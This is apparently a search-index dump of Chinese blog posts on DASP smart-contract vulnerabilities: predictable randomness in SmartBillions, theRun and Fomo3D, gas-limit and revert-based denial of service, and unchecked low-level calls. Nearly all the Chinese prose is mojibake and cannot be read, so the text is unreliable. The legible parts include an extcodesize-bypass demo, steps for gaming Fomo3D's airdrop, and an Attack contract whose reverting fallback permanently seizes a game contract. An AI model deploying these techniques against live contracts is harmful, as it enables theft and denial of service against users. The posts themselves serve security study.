åˆ©ç”¨ç§æœ‰å˜é‡seedå’Œiterationé€šè¿‡keccak256 hashè®¡ç®—å¾—åˆ°éšæœºæ•°ï¼Œè™½ç„¶seedå±æ€§ä¸ºprivateï¼Œä½†æ˜¯å®ƒä¹Ÿè¦åœ¨æŸä¸ªæ—¶é—´ç‚¹è®¾ç½®ï¼Œå¯ä»¥é€šè¿‡é“¾ä¸Šç›¸å…³txæ¥è·å–å…¶å€¼ï¼Œå› æ­¤éšæœºæ€§å¯é¢„æµ‹ã€‚ ç¬¬äºŒç§ function play() public payable { require(msg.value \u003e= 1 ether); if (block.blockhash(blockNumber) % 2 == 0) { msg.sender.transfer(this.balance); } } è¿™é‡Œä½¿ç”¨block.blockhash(blockNumber)æ¥è®¡ç®—éšæœºæ•°ï¼Œè¿™é‡Œå¿…é¡»å¼ºè°ƒçš„æ˜¯ï¼Œåœ¨solidityä¸­ï¼Œblock.blockhash(uint blockNumber) returns (bytes32)åªè®¡ç®—å°±è¿‘çš„256ä¸ªå—hashï¼Œå¦‚æœblockNumberä¸ºå½“å‰å—ï¼ˆblock.numberï¼‰æˆ–è€…è¶…è¿‡256æ›´ä¹…è¿œçš„å—ï¼Œè®¡ç®—ç»“æœéƒ½æ˜¯0. Quote block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero. åŒæ—¶Solidityæ–‡æ¡£ä¹Ÿå¼ºè°ƒå°½é‡ä¸è¦ä½¿ç”¨block.timestampã€nowå’Œblock.blockhashè®¡ç®—éšæœºæ•°ã€‚ Quote Do not rely on block.timestamp, now and block.blockhash as a source of randomness, unless you know what you are doing. Both the timestamp and the block hash can be influenced by miners to some degree. Bad actors in the mining community can for example run a casino payout function on a chosen hash and just retry a different hash if they did not receive any money. block.timestamp (uint): current block timestamp as seconds since unix epoch now (uint): current block timestamp (alias for block.timestamp) block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 æ¡ˆä¾‹ æˆ‘ä»¬å…ˆæ¥çœ‹ä¸¤ä¸ªDASPæä¾›çš„çœŸå®æ¡ˆä¾‹ã€‚ ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["åŒºå—é“¾"],"content":"SmartBillions æŠ«éœ²ï¼šSmartBillions lottery contract just got hacked! SmartBillionsæ˜¯ä¸€ä¸ªèµŒåšåˆçº¦ï¼ˆContract Source Codeï¼‰ï¼Œæœ¬èº«æ˜¯ä¸€ä¸ªICOé¡¹ç›®ã€‚ç©æ³•æ˜¯ä¸‹æ³¨6ä½æ•°ï¼Œæ¯ä½èŒƒå›´0-15ï¼ŒçŒœä¸­2ä½ä»¥ä¸Šä¼šè·å¾—ç›¸åº”å¥–åŠ±ã€‚æ ¹æ®è®ºå›ä½œè€…supr3mçš„æŠ«éœ²ï¼Œè¯¥åˆçº¦æœ¬èº«å­˜åœ¨éšæœºæ•°æ¼æ´ï¼Œé»‘å®¢åˆ©ç”¨è§¦å‘2æ¬¡æ¼æ´å–èµ°åˆçº¦ä¸­400ETHï¼Œåœ¨åç»­è¦åˆ©ç”¨æ¼æ´å…¨éƒ¨å–èµ°èµ„é‡‘æ—¶ï¼ŒICOåˆ©ç”¨åé—¨å‡½æ•°å†»ç»“èµ„é‡‘é˜²æ­¢èµ„é‡‘è¢«ç›—ã€‚è¿™ä¸ªåé—¨å‡½æ•°ä¹Ÿè¢«ä½œè€…åæ§½ï¼Œæ€€ç–‘ICOä¼šåˆ©ç”¨åé—¨é›†èµ„å·æ¬¾è·‘è·¯ã€‚ æˆ‘ä»¬å…ˆçœ‹ä¸‹é»‘å®¢åˆ©ç”¨åˆçº¦æ¼æ´åšçš„tx åˆçº¦æ‰§è¡Œæ ‡ç­¾å¯ä»¥çœ‹åˆ°ä¸¤ç¬”200ETHçš„æ“ä½œ åœ¨4337369å—ï¼Œåˆçº¦0x5ace17f87c7391e5792a7683069a8025b83bbd85å‘0x6245c1804F7fCEB305A60BBb5cb6E18F939EDB69è´¦æˆ·åœ°å€è½¬200ETHï¼Œæˆ‘ä»¬çœ‹ä¸‹è¯¥åœ°å€çš„TX é»‘å®¢é¦–å…ˆåœ¨4337096å—è°ƒç”¨åˆçº¦playSystem(uint _hash, address _partner)å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°000001ä¸ºä¸‹æ³¨çš„6ä½æ•° ç„¶åå†è¶…è¿‡256å—åçš„4337369å—è°ƒç”¨åˆçº¦won()å‡½æ•°ï¼Œèµ¢å¾—200ETHçš„äºŒç­‰å¥–é‡‘ï¼ˆçŒœä¸­å‰5ä¸ªä¸‹æ³¨æ•°ï¼‰ åœ¨ç¬¬äºŒæ­¥çš„è“æ¡†ä¸­é»‘å®¢è¿˜æƒ³ç»§ç»­åˆ©ç”¨åŒæ ·æ‰‹æ³•èµ¢å¾—ä¸€ç­‰å¥–é‡‘ï¼ˆ6ä¸ªä¸‹æ³¨æ•°å…¨ä¸­ï¼‰ æ ¹æ®è®ºå›ä½œè€…æè¿°å’Œé»‘å®¢æ“ä½œï¼Œå®¡è®¡åˆçº¦åï¼Œå‘ç°æ¼æ´æ˜¯åœ¨playSystem()ä¸­çš„won()å‡½æ•°ä¸­ï¼Œæ ¹æ®player.blockNumçš„hashå’Œä¸‹æ³¨çš„æ•°å­—åšæ¯”å¯¹ï¼Œè€Œè¿™ç§hashåœ¨è¶…è¿‡256ä¸ªå—åç»“æœä¸º0ï¼Œå› æ­¤é»‘å®¢æŠ¼çš„000001å’Œhashç»“æœ000000å‰5ä½ä¸€è‡´è€Œå¾—åˆ°äºŒç­‰å¥–ã€‚ ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:1","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["åŒºå—é“¾"],"content":"theRun #timestamp dependence bug Contract Source Code åˆçº¦ä¸­åˆ©ç”¨random(unit Max)å‡½æ•°è¿›è¡Œéšæœºæ•°ç”Ÿæˆï¼Œè€Œç”Ÿæˆå› å­ä¸»è¦æ˜¯åˆ©ç”¨block.timestampå’Œblock.numberï¼Œè€Œæ—¶é—´æˆ³å¯ä»¥ç”±çŸ¿å·¥æ“æ§ï¼Œæ•…çŸ¿å·¥å¯ä»¥é€‰æ‹©æœ‰åˆ©çš„éšæœºæ•°æ¥æé«˜è·å–å¥–åŠ±çš„æ¦‚ç‡ã€‚ function Participate(uint deposit) private { ... // Winning the Pot :) Condition : paying at least 1 people with deposit \u003e 2 ether and having luck ! if( ( deposit \u003e 1 ether ) \u0026\u0026 (deposit \u003e players[Payout_id].payout) ){ uint roll = random(100); //take a random number between 1 \u0026 100 if( roll % 10 == 0 ){ //if lucky : Chances : 1 out of 10 ! msg.sender.send(WinningPot); // Bravo ! WinningPot=0; } } ... } uint256 constant private salt = block.timestamp; function random(uint Max) constant private returns (uint256 result){ //get the best seed for randomness uint256 x = salt * 100 / Max; uint256 y = salt * block.number / (salt % 5) ; uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; //random number between 1 and Max } æ¥ç€æˆ‘ä»¬ç ”ç©¶ä¸‹å—éšæœºæ•°æ¼æ´å½±å“çš„å½“ä¸‹æœ€ç«æ¸¸æˆåˆçº¦Fomo3Dã€‚ ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:2","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["åŒºå—é“¾"],"content":"Fomo3D è¿™æ˜¯ä¸€ä¸ªå«JUSTçš„å›¢é˜Ÿå¼€å‘çš„ä»¥å¤ªåŠæ¸¸æˆï¼Œjuståœ¨è‹±æ–‡ä¸­æœ‰â€œå…¬æ­£ã€æ­£ä¹‰â€çš„æ„æ€ï¼Œç„¶è€Œæ¸¸æˆä»UIç•Œé¢åˆ°æ¸¸æˆè¯´æ˜å……æ»¡äº†æ¶æå’Œå¯¹äººæ€§è´ªå©ªçš„è®½åˆºï¼Œæ¯”å¦‚æ¨èé“¾æ¥åœ¨æ¸¸æˆä¸­å°±å«â€œåå»ºè®®â€ï¼Œå¼€å‘å›¢é˜Ÿå¹¶ä¸é¿è®³è¿™æ˜¯ä¸€ä¸ªä¹é€gameï¼Œå£°ç§°è¿™æ˜¯ä¸€æ¬¡å¤§å‹ç¤¾ä¼šå­¦å®éªŒã€‚ è¿™ä¸ªæ¸¸æˆæœ¬èº«å°±æ˜¯ä¸€ä¸ªåºæ°éª—å±€ï¼Œå„ä½çœ‹å®˜ä¸‰æ€è€Œåå…¥ï¼ æ¸¸æˆå®˜ç½‘ æ¸¸æˆç©æ³•ä»‹ç» FoMo3Dlong Source Code è€Œæ¼æ´å‘ç°çš„èµ·å› ä¹Ÿéå¸¸æœ‰è¶£ï¼ŒFomo3Dæ¸¸æˆçš„å¼€å‘è€…åœ¨twitterä¸Š@Vç¥ï¼Œè¯´å‘ç°ä¸€ä¸ªEVMä¸Šæ ¸å¼¹çº§æ¼æ´ï¼Œç»“æœè¢«Ethereumå›¢é˜Ÿleaderå›æ€¼ï¼Œå¹¶ä¸”é¡ºæ‰‹æ‰¾äº†ä¸€ä¸ªFomo3Dæ¸¸æˆæ¼æ´^_^ æ•…äº‹ç»è¿‡åœ¨æ–‡ç« Pwning Fomo3D Revealed: Iterative, Pre-Calculated Contract Creation For Airdrop Prizes!ä¸­æœ‰ä»‹ç»ï¼Œå¹¶ä¸”æè¿°äº†Fomo3Dæ¼æ´ã€‚ æ ¹æ®æ–‡ç« æè¿°Fomo3Då­˜åœ¨ä¸¤ä¸ªæ¼æ´å¯¼è‡´è¢«è–…ç¾Šæ¯›ã€‚ ç¬¬ä¸€ä¸ªæ¼æ´â€“é”™è¯¯çš„è®¿é—®æ§åˆ¶æ£€æŸ¥ï¼š modifier isHuman() { address _addr = msg.sender; uint256 _codeLength; assembly {_codeLength := extcodesize(_addr)} require(_codeLength == 0, \"sorry humans only\"); _; } FoMo3Dlongåˆçº¦ä½¿ç”¨isHuman()å‡½æ•°åˆ¤æ–­è°ƒç”¨è€…æ˜¯ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·è¿˜æ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œæ ¸å¿ƒåˆ©ç”¨assembly {_codeLength := extcodesize(_addr)}åˆ¤æ–­ï¼Œå…¶ä¸­å…³é”®å‡½æ•°extcodesize(a)ä»£è¡¨aåœ°å€ä¸Šçš„ä»£ç å¤§å°ï¼Œå¦‚æœç­‰äº0ï¼Œåˆ™ä»£è¡¨ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·ï¼Œé0åˆ™ä»£è¡¨åˆçº¦åœ°å€ï¼Œæœ¬èº«å¾ˆå¥½ç†è§£ã€‚ ä½†è¿™æ ·åˆ¤æ–­æœ‰ä¸ªé£é™©ï¼Œåœ¨Mechanism Design Security in Smart Contractsä¸€æ–‡ä¸­æåˆ°ï¼š Quote NOTE: Do not use the EXTCODESIZE check to prevent smart contracts from calling a function. This is not foolproof, it can be subverted by a constructor call, due to the fact that while the constructor is running, EXTCODESIZE for that address returns 0. ä¾‹ï¼šåˆçº¦Aä¸­æœ‰å‡½æ•°funAä½¿ç”¨å¦‚ä¸Šçš„è®¿é—®æ§åˆ¶ï¼Œå½“ä½ åœ¨ä¸€ä¸ªåˆçº¦Bçš„æ„é€ å‡½æ•°ï¼ˆconstructor()ï¼‰ä¸­è°ƒç”¨åˆçº¦Aä¸­çš„funAï¼Œå¯ç»•è¿‡è®¿é—®æ§åˆ¶æˆåŠŸè°ƒç”¨ï¼Œå°½ç®¡Bæ˜¯ä¸€ä¸ªåˆçº¦ã€‚extcodesize(B_addr) return 0. æˆ‘ä»¬å¯ä»¥é€šè¿‡remixéªŒè¯è¿™ä¸€ç‚¹ï¼š åˆçº¦Aï¼Œä¸»è¦åŠŸèƒ½æ˜¯åˆ¤æ–­è°ƒç”¨è€…æ˜¯å¤–éƒ¨è´¦æˆ·(è¿”å›false)è¿˜æ˜¯åˆçº¦è´¦æˆ·(è¿”å›true)ï¼š contract A { function isContract() public returns (bool isContract){ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } return (size \u003e 0); } } å‘å¸ƒåˆçº¦Aå¹¶å°†åˆçº¦Aåœ°å€å†™å…¥åˆçº¦Bï¼Œåˆçº¦Båˆ†åˆ«åœ¨æ„é€ å‡½æ•°å†…å¤–å»è°ƒç”¨åˆçº¦Açš„isContract()å‡½æ•°ï¼Œé€šè¿‡logæŸ¥çœ‹è¿”å›å€¼ï¼š interface demoInterface { function isContract() external returns (bool); } contract B { event LogConstructor(bool); event Logb(bool); constructor() public { demoInterface demo= demoInterface(0xdc544654fefd1a458eb24064a6c958b14e579154); emit LogConstructor(demo.isContract()); } function b() public { demoInterface demo= demoInterface(0xdc544654fefd1a458eb24064a6c958b14e579154); emit Logb(demo.isContract()); } } å‘å¸ƒåˆçº¦Bå¹¶ä¸”è°ƒç”¨æ–¹æ³•bï¼Œå¯¹æ¯”ä¸‹logä¸­æ‰“å°çš„è¿”å›å€¼ å¯ä»¥çœ‹åˆ°åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨å…¶ä»–åˆçº¦å—æ§ï¼ˆextcodesize()ï¼‰çš„æ–¹æ³•å¯ä»¥ç»•è¿‡è®¿é—®æ§åˆ¶ã€‚ ç¬¬äºŒä¸ªæ¼æ´â€“å¯é¢„æµ‹çš„éšæœºæ•°ï¼š Fomo3Dä¸­ä½ åœ¨èŠ±é’±ä¹°keyçš„æ—¶å€™ä¼šæœ‰ä¸€å®šå‡ ç‡è·å¾—ç©ºæŠ•ã€‚ function airdrop() private view returns(bool) { uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) \u003c airDropTracker_) return(true); else return(false); } å¯ä»¥çœ‹åˆ°éšæœºæ•°ç§å­seedçš„è®¡ç®—æ˜¯ç”±å½“å‰å—çš„ä¿¡æ¯åŠ ä¸Šmsg.senderæ„æˆï¼Œè€Œæ”»å‡»è€…å¯ä»¥åœ¨åˆé€‚çš„æ—¶é—´è®¡ç®—å¾—åˆ°å°äºairDropTracker_çš„seedï¼Œä»è€Œä¿è¯100%è·å–ç©ºæŠ•å¥–åŠ±ã€‚ æ–‡ç« æè¿°æ”»å‡»æ­¥éª¤å¯ä»¥æ€»ç»“ä¸ºï¼š Pre-calculate the address X of the next contract that the attacker address is about to create; If X canâ€™t be used to generate a good seed with the current airDropTracker_, goto step 1; Create contract at address X; Invoke buyXid() function from X to win the airdrop prize; Invoke withdraw() function from X to get earnings calculated by the airdrop prize; è¿™é‡Œè¿˜æœ‰ä¸ªçŸ¥è¯†ç‚¹æ˜¯å¦‚ä½•è®¡ç®—ä»¥å¤ªåŠåˆçº¦åœ°å€ï¼Œè¯»è€…å¯ä»¥å»ä¸»åŠ¨å­¦ä¹ ã€‚ How to PWN FoMo3D, a beginners guide åŒæ ·æä¾›äº†æ¼æ´åˆ†æåŠexpåˆ©ç”¨ã€‚ ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:3:3","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["åŒºå—é“¾"],"content":"0x03 æœ€ä½³å®è·µ åœ¨Predicting Random Numbers in Ethereum Smart Contractsä¸€æ–‡ä¸­ï¼Œè°ƒç ”3k+åˆçº¦å‘ç°43ä¸ªåˆçº¦å­˜åœ¨éšæœºæ•°å¯è¢«é¢„æµ‹çš„é—®é¢˜ï¼Œå…¶ä¸»è¦ç”±4ç±»æ¼æ´äº§ç”Ÿï¼š PRNGs using block variables as a source of entropy PRNGs based on a blockhash of some past block PRNGs based on a blockhash of a past block combined with a seed deemed private PRNGs prone to front-runningï¼ˆåç»­æ–‡ç« ä¼šè®²åˆ°ï¼‰ åŒæ—¶ä¹Ÿæè¿°äº†å¦‚ä½•å®ç°æ›´å®‰å…¨éšæœºæ•°çš„3ä¸­æ–¹æ³•ï¼š External oracles Signidice Commitâ€“reveal approach ","date":"2018-08-09","objectID":"/posts/dasp-bad-randomness-6.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Bad Randomness (6)","uri":"/posts/dasp-bad-randomness-6.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info åœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œå½“ è¶…è¿‡gasé™åˆ¶ï¼Œå¼‚å¸¸æŠ›å‡ºï¼Œéé¢„æœŸçš„ç»ˆæ­¢åˆçº¦ï¼Œè®¿é—®æ§åˆ¶è¢«ç ´å å‡ä¼šäº§ç”Ÿåˆçº¦æ‹’ç»æœåŠ¡é—®é¢˜ã€‚ æœ¬ç¯‡å°±ä»‹ç»DASPç¬¬äº”å¤§æ¼æ´â€“Denial of Service ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 Real World Impact ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:2:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["åŒºå—é“¾"],"content":"GovernMental èµ·å› ï¼šGovernMentalâ€™s 1100 ETH jackpot payout is stuck because it uses too much gas å®˜ç½‘ï¼šGovernMental æºç ï¼šetherscan code GovernMentalæœ¬èº«æ˜¯ä¸ªå˜²è®½æ”¿åºœåºæ°éª—å±€çš„æ¸¸æˆåˆçº¦ï¼Œå…¶è§„åˆ™å¤§æ¦‚ä¸ºæŠ•èµ„è€…ææœ€å°‘1ETHç»™æ”¿åºœï¼Œå¦‚æœæ”¿åºœåœ¨æœ€è¿‘12å°æ—¶å†…æ²¡æœ‰æ”¶åˆ°ä»»ä½•æèµ ï¼Œåˆ™å°†å¥–é‡‘å‘ç»™æœ€åä¸€åæŠ•èµ„äººï¼Œè€Œå¦‚æœæ”¶åˆ°å¥–åŠ±ï¼Œåˆ™æŒ‰ä¸€å®šæ¯”ä¾‹åˆ†åˆ«å°†é’±åˆ†ç»™èµ„é‡‘æ± ã€æ”¿åºœåŠæŠ•èµ„äººã€‚ å…¶ä¸­åœ¨å¤§äº12å°æ—¶æœªæ”¶åˆ°èµåŠ©çš„é€»è¾‘åˆ†æ”¯ä¸­ï¼Œå°†å¥–é‡‘åˆ†ç»™æœ€åä¸€åæŠ•èµ„äººåä¼šé‡ç½®æ‰€æœ‰æŠ•èµ„äººï¼š if (lastTimeOfNewCredit + TWELVE_HOURS \u003c block.timestamp) { // Return money to sender msg.sender.send(amount); // Sends all contract money to the last creditor creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash); corruptElite.send(this.balance); // Reset contract state lastCreditorPayedOut = 0; lastTimeOfNewCredit = block.timestamp; profitFromCrash = 0; creditorAddresses = new address[](0); // out of gas! creditorAmounts = new uint[](0); // out of gas! round += 1; return false; } ä»¥ä¸Šæ ‡æ³¨out of gasçš„ä¸¤è¡Œåœ¨åº•å±‚è¿è¡Œæ—¶ï¼Œä»£ç ä¼šå¾ªç¯éå†å­˜å‚¨ä½ç½®å¹¶é€ä¸ªåˆ é™¤ï¼Œå¦‚æœcreditorsè¿‡å¤šçš„è¯ï¼Œä¼šæ¶ˆè€—å¤§äºå½“å‰æœ€å¤§gasæ•°é‡å¯¼è‡´åˆçº¦å¤±æ•ˆã€‚ Governmental Attackï¼šç®€åŒ–ç‰ˆçš„GovernmentalåŠå…¶EXPåˆ©ç”¨ã€‚ ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:2:1","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["åŒºå—é“¾"],"content":"Parity kill() Parity Multisig Hacked. Again A Postmortem on the Parity Multi-Sig Library Self-Destruct è¿™ä¸ªå…¶å®åœ¨#DASP# Access Control (3)ä¸€ç¯‡ä¸­å·²ç»ä»‹ç»ï¼Œè¿˜æ˜¯åˆ©ç”¨è®¿é—®æ§åˆ¶æ¼æ´æ¥ç®¡parityé’±åŒ…ï¼Œç„¶åä¸æ˜¯å–é’±è¿˜æ˜¯è°ƒç”¨åˆçº¦ä¸­killå‡½æ•°é”€æ¯åˆçº¦ï¼Œä»è€Œå¯¼è‡´ä»»æ„ç”¨æˆ·éƒ½æ— æ³•ç»§ç»­ä½¿ç”¨ã€‚ // kills the contract sending everything to `_to`. function kill(address _to) onlymanyowners(sha3(msg.data)) external { suicide(_to); } ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:2:2","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["åŒºå—é“¾"],"content":"0x02 Example å®ä¾‹æ¥æºäºDASPï¼Œæ¨¡ä»¿King of the Etheræ¸¸æˆè§„åˆ™ï¼Œå½“ä½ å‘åˆçº¦å‘é€æ¯”ç°åœ¨priceå¤šçš„ethæ—¶ï¼Œä½ å°±å¯ä»¥æˆä¸ºæ€»ç»Ÿï¼Œä¹‹å‰çš„æ€»ç»Ÿä¼šæ”¶åˆ°å½“å‰priceçš„è¡¥å¿ï¼Œä¸”å½“å‰priceç¿»å€ã€‚ è€Œäº‰å¤ºè€…ä¸ºä¸€ä¸ªåˆçº¦ä¸”åœ¨fallbackå‡½æ•°ä¸­æ¶æ„æŠ›å‡ºå¼‚å¸¸ï¼Œåˆ™å¯ä»¥ç ´åæ¸¸æˆè§„åˆ™æ°¸è¿œæˆä¸ºæ€»ç»Ÿã€‚ contract PresidentOfCountry { address public president; uint256 public price; function PresidentOfCountry(uint256 _price) { require(_price \u003e 0); price = _price; president = msg.sender; } function becomePresident() payable { require(msg.value \u003e price); // must pay the price to become president president.transfer(price); // we pay the previous president president = msg.sender; // we crown the new president price = price * 2; // we double the price to become president } } contract Attack { function () { revert(); } function Attack(address _target) payable { _target.call.value(msg.value)(bytes4(keccak256(\"becomePresident()\"))); } } Attackåˆçº¦éƒ¨ç½²åé€šè¿‡æ„é€ å‡½æ•°è°ƒç”¨PresidentOfCountryåˆçº¦çš„becomePresident()å‡½æ•°ï¼ŒåŒæ—¶å‘é€å¤§äºpriceçš„ethï¼Œåˆ™æ‰§è¡ŒbecomePresidenté€»è¾‘ï¼Œ1. å‘ä¹‹å‰çš„è´¦æˆ·å‘é€priceè¡¥å¿ï¼›2. è‡ªå·±åˆçº¦è´¦æˆ·å˜ä¸ºpresidentï¼›3. priceç¿»å€ã€‚ å½“å…¶ä»–æ­£å¸¸è´¦æˆ·å‚ä¸æ¸¸æˆè°ƒç”¨becomePresidenté€»è¾‘æ—¶ï¼ŒåŒæ ·ä¼šå‘attachåˆçº¦åœ°å€ï¼ˆå½“å‰presidentï¼‰å‘é€priceï¼Œæ­£å› ä¸ºå½“å‰presidentä¸æ˜¯æ™®é€šè´¦æˆ·è¿˜æ˜¯åˆçº¦è´¦æˆ·ï¼Œtransferä¼šè§¦å‘åˆçº¦ä¸­fallbackå‡½æ•°ï¼Œè€Œæ¶ä¸šæ”»å‡»è€…åœ¨fallbackä¸­æ‰§è¡Œäº†revert()ï¼Œå¯¼è‡´å¼‚å¸¸ï¼Œä»è€Œæ— æ³•æ‰§è¡Œåç»­å˜æ›´æ€»ç»Ÿå’Œä»·æ ¼çš„é€»è¾‘ã€‚é€ æˆåˆçº¦DOSã€‚ å¯ä»¥å†remixä¸­æ¨¡æ‹Ÿä¸Šè¿°æ“ä½œã€‚ ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:3:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["åŒºå—é“¾"],"content":"0x03 Others é™¤äº†æ™ºèƒ½åˆçº¦ï¼Œé“¾æ ¸å¿ƒã€é“¾èŠ‚ç‚¹ã€åŒºå—é“¾ç›¸å…³çš„ç½‘å€éƒ½ä¼šå‡ºç°DOSã€‚ EOSIO EOSIO CVE-2018-11548 Bitcoin Core CVE-2016-10724 CVE-2016-10725 BitCoin Web çŸ¥åæ¯”ç‰¹å¸ç½‘ç«™bustabitä»·å€¼$12,000çš„ç‚¹å‡»åŠ«æŒã€XSSä»¥åŠæ‹’ç»æœåŠ¡æ¼æ´è¯¦æƒ…æ­ç§˜ ","date":"2018-08-09","objectID":"/posts/dasp-denial-of-services-5.html:4:0","tags":["BlockChain","DASP"],"title":"#DASP# Denial of Services (5)","uri":"/posts/dasp-denial-of-services-5.html"},{"categories":["åŒºå—é“¾"],"content":"0x00 Info Unchecked Return Values For Low Level Callsæ¼æ´ç®€å•ç†è§£å°±æ˜¯æ²¡æœ‰æ£€æŸ¥ä¸€äº›ä¸å®‰å…¨è°ƒç”¨å‡½æ•°çš„è¿”å›å€¼å¯¼è‡´ã€‚ ","date":"2018-08-03","objectID":"/posts/dasp-unchecked-return-valuse-4.html:1:0","tags":["BlockChain","DASP"],"title":"#DASP# Unchecked Return Valuse (4)","uri":"/posts/dasp-unchecked-return-valuse-4.html"},{"categories":["åŒºå—é“¾"],"content":"0x01 CALL -\u003e Contract åœ¨reentrancyæ¼æ´ä»‹ç»ä¸­æåˆ°å‡ ç§è´¦æˆ·é—´è½¬å¸å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬å›é¡¾å¹¶æ·±å…¥äº†è§£ä¸‹ï¼š å‡½æ•° ç‰¹æ€§ address.transfer() 1. å¤±è´¥æŠ›å‡ºå¼‚å¸¸ä¸”å›æ»š 2. æä¾›2300gasï¼Œé˜²æ­¢reentrancy address.send() 1. å¤±è´¥è¿”å›false 2. æä¾›2300gassï¼Œé˜²æ­¢reentrancy address.call.value().gas()() 1. å¤±è´¥è¿”å›false 2. å‘é€æ‰€æœ‰å¯ç”¨gas åœ¨è¿™äº›äº¤æ˜“å‡½æ•°ä¸­éœ€è¦æ³¨æ„çš„æ˜¯ï¼š addr.transfer()å’Œaddr.send()èƒ½å¤Ÿé˜²æ­¢é‡å…¥æ¼æ´ã€‚ä½†æ˜¯è¿™äº›æ–¹æ³•ä¼šè§¦å‘fallbackå‡½æ•°æ‰§è¡Œï¼Œè¢«è°ƒåˆçº¦ä»…è¢«æä¾›2300gasåšä¸€äº›æ—¥å¿—äº‹ä»¶ã€‚ x.transfer(y)ç­‰åŒäºrequire(x.send(y))ï¼Œtransferåœ¨å‘é€å¤±è´¥æ—¶ä¼šè‡ªåŠ¨revertï¼ˆå†…ç½®å¤±è´¥å¤„ç†ï¼‰ã€‚ addr.call.value(y)()ä¹Ÿä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯ä¼šç”¨æ‰€æœ‰æä¾›çš„gasæ‰§è¡Œä»£ç ï¼Œå½“ç„¶è¿™ç§æ–¹å¼ä¸èƒ½é˜²æ­¢reentrancyæ¼æ´ã€‚ é€šè¿‡äº†è§£ä»¥ä¸Šæˆ‘ä»¬ä¼šæå‡ºä¸€äº›ç–‘é—®ï¼š 2300gasç”±è°æ¥æä¾›ï¼Ÿä¸ºä½•æ˜¯2300gas? 2300gasèƒ½åšä»€ä¹ˆï¼Ÿ å“ªäº›è¡Œä¸ºä¼šå¯¼è‡´å‘é€å¤±è´¥ï¼Ÿ è¦å›ç­”è¿™äº›é—®é¢˜ï¼Œé¦–å…ˆè¦çŸ¥é“ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œtransferã€sendã€callåœ¨EVMè™šæ‹Ÿæœºæ‰§è¡Œæ—¶ä¼šå°†è¿™äº›solidityç¼–è¯‘æˆ CALL æŒ‡ä»¤ï¼Œè€Œåœ¨ä»¥å¤ªåŠwikiä¸­å®šä¹‰äº†CALLçš„gasæ¶ˆè€—ï¼š Quote CALL has a multi-part gas cost: 700 base 9000 additional if the value is nonzero 25000 additional if the destination account does not yet exist (note: there is a difference between zero-balance and nonexistent!) CALLCODE operates similarly to call, except without the potential for a 25000 gas surcharge. The child message of a nonzero-value CALL operation (NOT the top-level message arising from a transaction!) gains an additional 2300 gas on top of the gas supplied by the calling account; this stipend can be considered to be paid out of the 9000 mandatory additional fee for nonzero-value calls. This ensures that a call recipient will always have enough gas to log that it received funds. ä»wikiä¸­å¯ä»¥çŸ¥é“äº¤æ˜“æ“ä½œè‡³å°‘éœ€è¦9700gasï¼ˆ700base+9000additionalï¼‰ï¼Œè€Œ2300gaså°±åœ¨å…¶ä¸­ï¼Œç”±æ¥æ”¶åˆçº¦æä¾›ï¼Œç¡®ä¿æœ‰è¶³å¤Ÿgasè®°å½•å…¶æ¥æ”¶çš„èµ„é‡‘ã€‚2300gaså±äºç¡¬ç¼–ç 